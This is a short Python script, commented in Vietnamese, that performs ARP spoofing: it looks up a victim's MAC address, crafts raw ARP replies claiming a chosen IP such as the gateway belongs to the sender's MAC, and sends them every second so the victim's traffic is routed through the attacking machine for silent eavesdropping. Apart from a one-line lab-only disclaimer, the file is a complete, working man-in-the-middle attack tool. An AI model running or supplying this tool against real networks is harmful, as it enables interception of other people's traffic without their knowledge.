#!/usr/bin/env python3
"""arp-gia.py <card> <IP giả làm> <IP nạn nhân> [số lần] — ARP GIẢ MẠO (ARP spoofing), CHỈ dùng trong mạng lab của bạn.
Mỗi giây gửi cho nạn nhân một gói ARP reply: "<IP giả làm> ở MAC của tôi". Nạn nhân ghi đè bảng ARP ⇒ gói đi cổng mặc định
chạy qua máy này (bật ip_forward thì chuyển tiếp tiếp — nạn nhân vẫn có mạng, không biết mình đang bị nghe lén)."""
import socket, struct, sys, time, subprocess
card, gia, nan, lan = sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4]) if len(sys.argv) > 4 else 10
mac = open(f'/sys/class/net/{card}/address').read().strip()
subprocess.run(['ping', '-c', '1', '-W', '1', nan], capture_output=True)          # để có MAC nạn nhân trong bảng ARP của mình
mac_nan = next(l.split()[4] for l in subprocess.run(['ip', 'neigh', 'show', nan], capture_output=True, text=True).stdout.splitlines() if 'lladdr' in l)
b = lambda m: bytes.fromhex(m.replace(':', ''))
ip = socket.inet_aton
goi = b(mac_nan) + b(mac) + b'\x08\x06' + struct.pack('!HHBBH', 1, 0x0800, 6, 4, 2) + b(mac) + ip(gia) + b(mac_nan) + ip(nan)
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW); s.bind((card, 0))
print(f'gửi {lan} lần: "{gia} is-at {mac}" ⇒ {nan} ({mac_nan})', flush=True)
for _ in range(lan):
    s.send(goi); time.sleep(1)
